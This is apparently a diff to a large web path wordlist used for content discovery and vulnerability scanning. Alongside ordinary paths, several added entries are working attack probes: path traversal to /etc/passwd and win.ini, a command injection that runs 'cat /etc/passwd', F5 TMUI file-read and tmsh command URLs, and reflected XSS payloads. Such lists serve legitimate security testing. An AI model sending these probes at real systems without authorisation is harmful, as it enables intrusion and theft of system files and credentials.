@@ -88928,6 +89124,7 @@ JeddahMali
 jedis
 jedit
 jedquery.js
+jeecg-boot
 jeep
 Jeep
 Jeeves
@@ -89614,6 +89811,7 @@ jnj
 jnl
 jnlp-inf/application.jnlp
 JNLP-INF/APPLICATION.JNLP
+jnlpJars
 jnp
 jo
 JO
@@ -89724,6 +89922,7 @@ jobman
 jobmanager
 jobmanager/logs
 jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
 jobmgr.js
 jobmine.js
 jobnet.js
@@ -89917,6 +90116,7 @@ jolokia/list?maxObjects=100
 jolokia/read/java.lang:type=*/HeapMemoryUsage
 jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
 jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html
+jolokia/read<svgonload=alert(document.domain)>?mimeType=text/html
 jolokia/search/*:j2eeType=J2EEServer,*
 jolokia/search/*:test=test
 jolokia/version
@@ -90003,7 +90203,9 @@ joshua
 joshua.js
 josie
 josso/%5c../invoker/ejbinvokerservlet
+josso/%5C../invoker/EJBInvokerServlet/
 josso/%5c../invoker/jmxinvokerservlet
+josso/%5C../invoker/JMXInvokerServlet/
 josu.js
 jot.js
 jotason.js
@@ -91554,6 +91756,7 @@ kafka-log-dirs.xml
 kafka-log4j-rolling.properties
 kafka-log4j.properties
 kafka-logs
+kafka-manager/
 kafka-metrics-reporter-log4j.properties
 kafka-metrics.properties
 kafka-mirror-maker.bat
@@ -95408,6 +95611,7 @@ libs/cq/ui/content/dumplibs.html
 libs/dam/merge/metadata.html?path=/etc&.ico
 libs/foundation/components/primary/cq/workflow/components/participants/json.GET.servlet
 libs/granite/core/content/login.html
+libs/granite/core/content/login/favicon.ico
 libs/granite/offloading/content/view.html
 libs/granite/security/content/useradmin.html
 libs/spaw/dialogs/dialog.php
@@ -96312,6 +96516,7 @@ linux1.php
 linuxadmin
 linuxdoc
 linuxinstall
+linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;
 linuxnode
 linuxprinting
 linuxse.php
@@ -97981,6 +98186,7 @@ login;
 login;/..;/admin
 login;foo
 Login?!'><sVg/OnLoAD=alert`1337`//
+Login?!><sVg/OnLoAD=alert`1337`//
 login?csrfkey=
 login?from=0.000000
 login?login=lutron&password=lutron
@@ -98431,6 +98637,7 @@ logs/application/security.log
 logs/application/server.log
 logs/application/system.log
 logs/awstats.pl
+logs/catalina.out
 logs/development.log
 logs/error_log
 logs/error.log
@@ -103350,6 +103557,7 @@ Message-Center
 MESSAGE-CENTER
 Message-Error.htm
 message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+message?title=x&msg=%26%23<svg/onload=alert(1337)>
 message.asp
 message.aspx
 Message.aspx
@@ -103758,6 +103966,7 @@ Mgmt
 mgmt-groups.properties
 mgmt-users.properties
 mgmt/tm/sys/management
+mgmt/tm/sys/management-ip
 mgp
 MGP
 mgplayer.js
@@ -105401,6 +105610,7 @@ modules/README.txt
 modules/servers
 modules/spaw2/dialogs/dialog.php
 modules/system
+modules/system/assets/js/framework.combined-min.js
 modules/tinymce/tinymcemoduleinfo
 modules/tinymce/tinymcemoduleinfo.js
 modules/TinyMCE/TinyMCEModuleInfo.js
@@ -105728,6 +105938,7 @@ monit.conf
 moniteau
 monitor
 Monitor
+monitor_agent
 monitor.asp
 Monitor.asp
 monitor.aspx
@@ -108488,6 +108699,7 @@ nagios-sysconfig-Windows
 nagios.cfg
 nagios.cfg.sample
 nagios.js
+nagios/cgi-bin/status.cgi
 nagiosxi/install.php
 nagiosxi/login.php
 nagl
@@ -111018,6 +111230,7 @@ ngrepeat.js
 ngrequest.js
 ngrestful.js
 ngrok.js
+ngrok2/ngrok.yml
 ngsi.js
 ngtabhead.js
 ngtap.js
@@ -111472,6 +111685,8 @@ nodaway
 node
 node_1.log
 node_env
+node_info
+node_info.json
 node_modules
 node_modules/../../../../../etc/passwd
 node_modules/.env
@@ -111479,6 +111694,7 @@ node_modules/body-parser/package.json
 node_modules/mqtt/test/helpers/
 node_pre_gyp_accesskeyid
 node_pre_gyp_secretaccesskey
+node_stats
 node_voting
 node-config.yaml
 node-helper.sh
@@ -111486,6 +111702,7 @@ node-role.kubernetes.io
 node.admin.inc
 node.conf
 node.gif
+node.json
 node.php
 node.pp
 node.sh
@@ -111494,6 +111711,7 @@ node.xml
 node/1
 node/1?_format=hal_json
 node/10
+node/details.json
 nodeai.js
 nodeapi.js
 nodeblob.js
@@ -112991,6 +113209,7 @@ oa.htm
 oa.sql
 oaa
 oab
+oab/
 oabg.js
 oaboard
 oac
@@ -113281,6 +113500,7 @@ ocb.js
 occ
 occ/item
 occ/item/content/0
+occ/v2/d2OzBcy
 occasion
 Occasion
 occasions
@@ -116372,6 +116592,7 @@ ourWorks.php
 out
 Out
 out_click
+out_heap_dump
 out_popup.php
 out-of-date
 Out-Of-Date
@@ -116587,6 +116808,7 @@ ovicedo
 ovidentia
 oviedo
 oviedo.html
+ovirt-engine
 ovirt-engine/userportal/
 ovirt-engine/webadmin/
 ovjsp
@@ -116621,6 +116843,7 @@ owa_util.txtowsource
 owa_util.xmlow_query_columns
 owa_util.xmlowsoucre
 owa_util.xmlowsource
+owa/
 owa/auth/logon.aspx
 owa/auth/logon.aspx?replaceCurrent=1&url=ecp
 owa/auth/x.js
@@ -121160,6 +121383,7 @@ php/include
 php/mysql
 php/php.cgi
 php/phpmyadmin
+php/phpmyadmin/
 php/phpmyadmin/scripts/setup.php
 php/phpmyadmin2102/scripts/setup.php
 php/ping.php?hostname=|dir
@@ -123393,6 +123617,7 @@ plugins/search/..\..\..\conf\openfire.xml
 plugins/servlet/gadgets/makerequest
 plugins/servlet/gadgets/makeRequest
 plugins/servlet/gadgets/makerequest?url=https
+plugins/servlet/gadgets/makeRequest?url=https
 plugins/servlet/gadgets/makerequest?url=https://google.com
 plugins/servlet/gadgets/makeRequest?url=https://google.com
 plugins/servlet/oauth/users/icon
@@ -123769,6 +123994,7 @@ pods.txt
 Pods.xcodeproj
 pods.yaml
 pods.yml
+podSandboxStatus
 podsecuritypolicy.yaml
 podstrony
 podu.js
@@ -124457,6 +124683,8 @@ portal//..\\\..\\\..\\\..\\\windows\win.ini
 portal/app_dev.php
 portal/app_dev.php/_profiler
 portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+portal/favicon.ico
+portal/images/MyVue/MyVueHelp.png
 portal/index/protocol.html
 portal/login
 portal/page
@@ -125085,6 +125313,7 @@ powerseek
 powerseller
 powerSeller
 powershell
+powershell/
 powerstock
 powersum.js
 powertech
@@ -126701,6 +126930,7 @@ probe
 probe.php
 proben
 proberv.php
+probes
 probind.js
 probit.js
 problem
@@ -129160,6 +129390,8 @@ proxylog.js
 proxymgr.js
 proxymsa.js
 proxysync.js
+proxytest.jsp
+proxytui
 proxytunnel
 proxyview.js
 proyecto
@@ -129607,6 +129839,7 @@ public.mbizgroup
 public.p12
 public.pem
 public.php
+public/
 public/.env
 public/.git/config
 public/.htaccess
@@ -129642,55 +129875,103 @@ public/ly/order.html
 public/mobile/js/config.js
 public/plugins
 public/plugins/alertGroups/../../../../../../../../etc/passwd
+public/plugins/alertGroups/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
 public/plugins/alertlist/../../../../../../../../etc/passwd
+public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/alertmanager/../../../../../../../../etc/passwd
+public/plugins/alertmanager/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/annolist/../../../../../../../../etc/passwd
+public/plugins/annolist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/barchart/../../../../../../../../etc/passwd
+public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/bargauge/../../../../../../../../etc/passwd
+public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/canvas/../../../../../../../../etc/passwd
+public/plugins/canvas/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/cloudwatch/../../../../../../../../etc/passwd
+public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/dashboard/../../../../../../../../etc/passwd
+public/plugins/dashboard/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/dashlist/../../../../../../../../etc/passwd
+public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/debug/../../../../../../../../etc/passwd
+public/plugins/debug/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/elasticsearch/../../../../../../../../etc/passwd
+public/plugins/elasticsearch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/gauge/../../../../../../../../etc/passwd
+public/plugins/gauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/geomap/../../../../../../../../etc/passwd
+public/plugins/geomap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/gettingstarted/../../../../../../../../etc/passwd
+public/plugins/gettingstarted/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
 public/plugins/grafana-clock-panel/../../../../../../../etc/passwd
 public/plugins/grafana/../../../../../../../../etc/passwd
+public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/graph/../../../../../../../../etc/passwd
+public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/graphite/../../../../../../../../etc/passwd
+public/plugins/graphite/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/heatmap/../../../../../../../../etc/passwd
+public/plugins/heatmap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/histogram/../../../../../../../../etc/passwd
+public/plugins/histogram/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+public/plugins/icon/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/influxdb/../../../../../../../../etc/passwd
+public/plugins/influxdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/jaeger/../../../../../../../../etc/passwd
+public/plugins/jaeger/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/live/../../../../../../../../etc/passwd
+public/plugins/live/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/logs/../../../../../../../../etc/passwd
+public/plugins/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/loki/../../../../../../../../etc/passwd
+public/plugins/loki/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/mixed/../../../../../../../../etc/passwd
+public/plugins/mixed/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/mssql/../../../../../../../../etc/passwd
+public/plugins/mssql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/mysql/../../../../../../../../etc/passwd
+public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/news/../../../../../../../../etc/passwd
+public/plugins/news/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/nodeGraph/../../../../../../../../etc/passwd
+public/plugins/nodeGraph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/opentsdb/../../../../../../../../etc/passwd
+public/plugins/opentsdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/piechart/../../../../../../../../etc/passwd
+public/plugins/piechart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/pluginlist/../../../../../../../../etc/passwd
+public/plugins/pluginlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/postgres/../../../../../../../../etc/passwd
+public/plugins/postgres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/prometheus/../../../../../../../../etc/passwd
+public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/stat/../../../../../../../../etc/passwd
+public/plugins/stat/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/state-timeline/../../../../../../../../etc/passwd
+public/plugins/state-timeline/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/status-history/../../../../../../../../etc/passwd
+public/plugins/status-history/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/table-old/../../../../../../../../etc/passwd
+public/plugins/table-old/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/table/../../../../../../../../etc/passwd
+public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/tempo/../../../../../../../../etc/passwd
+public/plugins/tempo/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/testdata/../../../../../../../../etc/passwd
+public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/text/../../../../../../../../etc/passwd
+public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/timeseries/../../../../../../../../etc/passwd
+public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/welcome/../../../../../../../../etc/passwd
+public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/xychart/../../../../../../../../etc/passwd
+public/plugins/xychart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/plugins/zipkin/../../../../../../../../etc/passwd
+public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
 public/robots.txt
 public/sample-config.js
 public/spaw2/dialogs/dialog.php
@@ -131583,6 +131864,7 @@ rails/info/properties
 rails/info/properties.json
 rails/info/properties.xml
 rails/info/routes
+rails/info/routes.json
 rails/info/sessions
 rails/info/versions
 railsapp/config/storage.yml
@@ -136623,18 +136905,26 @@ robots.php
 robots.txt
 Robots.txt
 robots.txt..;
+robots.txt..;/
 robots.txt../admin
+robots.txt../admin/
 robots.txt..%3b
+robots.txt..%3B/
 robots.txt.20090320
 robots.txt.20120205
 robots.txt.dist
 robots.txt.json
 robots.txt.ts
 robots.txt/..;
+robots.txt/..;/
 robots.txt/../admin
+robots.txt/../admin/
 robots.txt/..%3b
+robots.txt/..%3B/
 robots.txt/%2e%2e%3b
+robots.txt/%2e%2e%3B/
 robots.txt%2e%2e%3b
+robots.txt%2e%2e%3B/
 robots/.env
 robotsim.js
 robotstats
@@ -137350,6 +137640,7 @@ rpc.json
 rpc.php
 rpc.ts
 rpc.txt
+rpc/
 rpc2
 RPC2
 rpcdebug.js
@@ -137855,6 +138146,7 @@ rules/local.rules
 rulesanddefaults.sql
 rulescene.js
 rulesets.js
+rulez
 rum
 rumor
 rumours
@@ -138251,6 +138543,7 @@ S3cr3t.json
 s3cr3t.txt
 S3cr3t.txt
 s3load.php
+s3proxy.conf
 s4
 s5
 S5
@@ -139213,6 +139506,7 @@ sap/hana/xs/formLogin/login.html
 sap/public/icman/ping
 sap/public/info
 sap/wdisp/admin
+sap/wdisp/admin/public/default.html
 sap/xml
 sap/xml/soap
 sap/xml/soap/xmla
@@ -139914,6 +140208,7 @@ Scheduler
 scheduler-config.yaml
 scheduler.conf
 scheduler.sh
+scheduler/
 scheduler/docs
 scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..bak
 schedulers
@@ -140459,6 +140754,7 @@ scriptsur.js
 scripttags
 ScriptTags
 scriptTest
+scriptText
 scriptures
 scripturi
 scriptvar.js
@@ -140886,6 +141182,7 @@ search97
 search97cgi
 searcha.asp
 searchable
+searchableSnapshots
 searchaction.asp
 searchaction.html
 searchadmin.php
@@ -141767,6 +142064,7 @@ secure.py
 secure.ts
 secure.txt
 secure/.htaccess
+secure/admin
 secure/attachmentzip
 secure/configureportalpages!default.jspa?view=popular
 secure/ConfigurePortalPages!default.jspa?view=popular
@@ -141780,7 +142078,9 @@ secure/downloadfile
 secure/downloadFile
 secure/managefilters.jspa?
 secure/managefilters.jspa?filter=popular&filterview=popular
+secure/ManageFilters.jspa?filter=popular&filterView=popular
 secure/managefilters.jspa?filterview=search&search=search&filterview=search&sortcolumn=favcount&sortascending=false
+secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
 secure/popups/userpickerbrowser.jspa
 secure/popups/UserPickerBrowser.jspa
 secure/querycomponent!default.jspa
@@ -143716,6 +144016,7 @@ servlet/RedirectServlet
 servlet/RequestHeaderExample
 servlet/RequestInfoExample
 servlet/RequestParamExample
+servlet/Satellite?destpage=%22%3Ch1xxx%3Cscriptalert(1)%3C%2Fscript&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
 servlet/servletToJsp
 servlet/SessionExample
 servlet/SessionServlet
@@ -143749,6 +144050,7 @@ servlets-examples
 servlets/FetchFile?fileName=../../../etc/passwd
 servlets/weboam/oam/oamLogin
 ServletToJsp
+servlist.conf
 servme.js
 servo_handbook
 servselect
@@ -147759,6 +148061,9 @@ slovene.js
 slovenia
 slovenia.html
 slow
+slow_query
+slow_query/<tag>
+slow_query/all
 slow-query.log
 slowbro.js
 slowimg.js
@@ -151573,10 +151878,13 @@ static-pages
 static-root/.env
 static?/%2557EB-INF/web.xml
 static..;
+static..;/
 static../.env
 static../.git/config
 static../admin
+static../admin/
 static..%3b
+static..%3B/
 static..bak
 static.asp
 static.conf
@@ -151589,16 +151897,27 @@ static.ts
 static.txt
 static/
 static/..;
+static/..;/
 static/../../../../../../../../../../../etc/shells
 static/../../../a/../../../../etc/passwd
 static/../admin
+static/../admin/
 static/..%3b
+static/..%3B/
+static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
+static/..%5c..%5c..%5c..%5c..%5cetc/passwd
+static/..%5c..%5c..%5c..%5cetc/passwd
+static/..%5c..%5c..%5cetc/passwd
+static/..%5c..%5cetc/passwd
+static/..%5cetc/passwd
 static/.env
 static/.git/config
 static/.gitignore
 static///////../../../../etc/passwd
 static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 static/%2e%2e%3b
+static/%2e%2e%3B/
 static/admincp/js/common.js
 static/api/swagger.json
 static/api/swagger.yaml
@@ -151610,6 +151929,7 @@ static/data/gamedatas.js
 static/data/thirdgames.json
 static/diff_worker.js
 static/dump.sql
+static/emq.ico
 static/hgicon.png
 static/home/js/rooms.js
 static/home/static/js/login.js
@@ -151627,6 +151947,7 @@ static/wap/js/common.js
 static/xianyu/js/bankcheck.js
 static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shells
 static%2e%2e%3b
+static%2e%2e%3B/
 static1
 static2
 staticapi.js
@@ -152254,6 +152575,7 @@ storage_sna.ps1ot_config.ps1
 storage_sna.txtot_config.txt
 storage_sna.xmlot_config.xml
 storage_snapshot_config.sh
+storage-capacity
 storage-class.yaml
 storage-config.yaml
 storage-service
@@ -154244,6 +154566,7 @@ swagger-docs.yaml
 swagger-examples.json
 swagger-extensions.json
 swagger-headers.json
+swagger-json
 swagger-links.json
 swagger-models.json
 swagger-operations.json
@@ -154290,6 +154613,10 @@ swagger-ui.js
 swagger-ui.json
 swagger-ui.yaml
 swagger-ui.yml
+swagger-ui/
+swagger-ui/index.html
+swagger-ui/o2c.html
+swagger-ui/oauth2-redirect.html
 swagger-ui/swagger-ui.js
 swagger-ui/swagger.json
 swagger-ui/swagger.yaml
@@ -154305,6 +154632,8 @@ swagger.yaml
 swagger.yml
 swagger/
 swagger/api-docs
+swagger/doc.html
+swagger/doc.json
 swagger/docs/v1
 swagger/index.html
 swagger/static/index.html
@@ -154318,6 +154647,7 @@ swagger/ui/swagger-ui.js
 swagger/v1
 swagger/v1/api-docs
 swagger/v1/swagger.json
+swagger/v1/swagger.json/
 swagger/v1/swagger.yaml
 swagger/v2
 swagger/v2/api-docs
@@ -154325,6 +154655,7 @@ swagger/v2/swagger.json
 swagger/v2/swagger.yaml
 swaggerhub/swaggerhub-extension/.npmrc
 swaggerui
+swaggerui/
 swahili
 swain
 swajax1.cfm
@@ -154800,6 +155131,7 @@ sysman/reporting
 sysmanage
 sysmanager
 sysmgmt/2015/bmc/info
+sysmgmt/2015/bmc/info"  # Firmware Version and other info (iDRAC9
 sysmgr
 sysmod
 sysop
@@ -155575,6 +155907,7 @@ tag.aspx
 Tag.aspx
 tag.cfm
 tag.html
+tag.json
 tag.liquid
 tag.php
 tag.phtml
@@ -156208,6 +156541,7 @@ td
 TD
 td_redirect.php
 td-agent.conf
+td-agent.log
 td.html
 td.php
 tdaomysql.js
@@ -160374,10 +160708,15 @@ tmstrader.js
 tmtest
 tmui/login.jsp
 tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp?filename=/config/bigip.license
+tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
 tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp?filename=/etc/f5
+tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5
 tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp?filename=/etc/passwd
+tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
 tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp?filename=/etc/passwd'
+tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
 tmui/login.jsp/..;/tmui/locallb/workspace/tmshcmd.jsp?command=list+auth+user+admin'
+tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
 tmui/tmui/login/welcome.jsp
 tmunblock.cgi
 tmuninstallxml.cfm
@@ -160690,6 +161029,7 @@ tomcat-juli.jar
 tomcat-redis-session-manager.jar
 tomcat-server.xml
 tomcat-servlets.jar
+tomcat-status
 tomcat-tribes.jar
 tomcat-users.cfg
 tomcat-users.conf
@@ -161534,8 +161874,10 @@ traces
 tracetest.js
 tracetime.js
 tracey
+tracez
 traci
 tracie
+tracing
 tracing_config.yml
 tracing-secret.yaml
 tracing.html
@@ -163577,6 +163919,7 @@ ui/login
 ui/login.action
 ui/login/
 ui/vault
+ui/vault/auth
 ui/vault/auth?with=oidc%2F
 ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/shells
 ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file://C:\\Windows\\win.ini
@@ -164814,6 +165157,7 @@ uploads.py
 uploads.rb
 uploads.ts
 uploads.txt
+uploads/
 uploads/.env
 uploads/3Dmodel.obj
 uploads/admin.php
@@ -166573,9 +166917,12 @@ v1
 V1
 v1.0
 V1.0
+v1.0/
 v1.01
 v1.1
 v1.2
+v1.37/info
+v1.37/version
 v1.5
 v1.6
 v1.8
@@ -166743,7 +167090,9 @@ v1/geoip
 v1/get-refer-list
 v1/graph
 v1/graphiql
+v1/graphiql.css
 v1/graphiql.js
+v1/graphiql.min.css
 v1/graphiql.min.js
 v1/graphiql.php
 v1/graphiql/finland
@@ -166940,7 +167289,9 @@ v2/exchange/callback/pub
 v2/explorer
 v2/graph
 v2/graphiql
+v2/graphiql.css
 v2/graphiql.js
+v2/graphiql.min.css
 v2/graphiql.min.js
 v2/graphiql.php
 v2/graphiql/finland
@@ -167032,7 +167383,9 @@ v3/data/Sank/Sank/Roles
 v3/explorer
 v3/graph
 v3/graphiql
+v3/graphiql.css
 v3/graphiql.js
+v3/graphiql.min.css
 v3/graphiql.min.js
 v3/graphiql.php
 v3/graphiql/finland
@@ -167059,6 +167412,7 @@ v3/weather/now.json
 v3/withdrawals-fungible
 v3/withdrawals-nonfungible
 v3alpha
+v3alpha/auth/authenticate
 v3b
 v3chat
 v3chatrooms
@@ -167076,7 +167430,9 @@ v4/api/graphql
 v4/explorer
 v4/graph
 v4/graphiql
+v4/graphiql.css
 v4/graphiql.js
+v4/graphiql.min.css
 v4/graphiql.min.js
 v4/graphiql.php
 v4/graphiql/finland
@@ -167509,7 +167865,9 @@ var/lib/cloud/instance/user-data.txt
 var/lib/cloud/instance/user-data.txt.i
 var/lib/cloud/instance/vendor-data.txt
 var/lib/cloud/instance/vendor-data.txt.i
+var/lib/mysql/mysql/user.frm
 var/lib/phpmyadmin/config.inc.php
+var/lib/postgresql/data/pg_hba.conf
 var/lib/tomcat7/webapps/bodgeit/about.jsp
 var/lib/tomcat7/webapps/bodgeit/admin.jsp
 var/lib/tomcat7/webapps/bodgeit/advanced.jsp
@@ -172401,6 +172759,7 @@ webapp
 webapp_data
 webapp_template
 webapp/?fccc%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+webapp/?fccc0\><script>alert(1)</script>5f43d=1
 webapp/admin
 webapp/admin/_pages/_bc4jadmin
 webapp/admin/bc4jadmin.htm
@@ -172426,6 +172785,7 @@ WebApplication3
 webapps
 WebApps
 webapps/phpmyadmin/scripts/setup.php
+webapps/ROOT/WEB-INF/web.xml
 webar
 webarchiv
 webarok.js
@@ -172932,6 +173292,8 @@ webmail/
 webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
 webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 webmail/calendar/minimizer/
+webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd
+webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
 webmail/login/
 webmail/old/calendar/minimizer/
 webmail/src/configtest.php
@@ -173486,6 +173848,7 @@ webtext
 webticket
 webticket/webticketservice.svc
 webticket/webticketservice.svcabs
+webticket/webticketservice.svcabs/
 webtiming.js
 webtipps
 webtoolbar
@@ -174836,6 +175199,8 @@ wordpress.zip
 wordpress/wp-admin
 wordpress/wp-admin/install.php
 wordpress/wp-admin/setup-config.php
+wordpress/wp-config.php
+wordpress/wp-content/debug.log
 wordpress/wp-content/plugins/easy-wp-smtp
 wordpress/wp-content/plugins/plugins/greengo.php
 wordpress/wp-content/plugins/wp-file-manager/readme.txt
@@ -175900,6 +176265,7 @@ wp-includes/modules/wp-login.php
 wp-includes/rss-functions.php
 wp-includes/sym404/root/etc/passwd
 wp-includes/wlwmanifest.xml
+wp-includes/wp-db.php
 wp-json
 wp-json/acf/v3/options/a?id=active&field=plugins
 wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search=
@@ -176572,6 +176938,7 @@ www/.env
 www/.git/config
 www/admin/index.php
 www/delivery/afr.php?refresh=10000&")',10000000);alert(1337);setTimeout('alert("
+www/delivery/afr.php?refresh=10000&\),10000000);alert(1337);setTimeout(alert(\
 www/lib/classes/googlechart/markers/googlechartmapmarker.php
 www/phpmyadmin
 www/phpMyAdmin
@@ -176780,6 +177147,7 @@ xamlsyntax.config
 xamlSyntax.config
 xampp
 xampp/phpmyadmin
+xampp/phpmyadmin/
 xampp/phpmyadmin/index.php
 xampp/phpmyadmin/scripts/setup.php
 xanadu
@@ -177190,6 +177558,7 @@ XmlPackages
 xmlparser
 xmlparser.php
 XmlPeek.aspx?dt=\\..\\..\\..\\..\\..\\..\\Windows\\win.ini&x=/validate.ashx?requri
+XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri
 xmlpserver/ReportTemplateService.xls
 xmlpserver/services/XMLPService
 xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
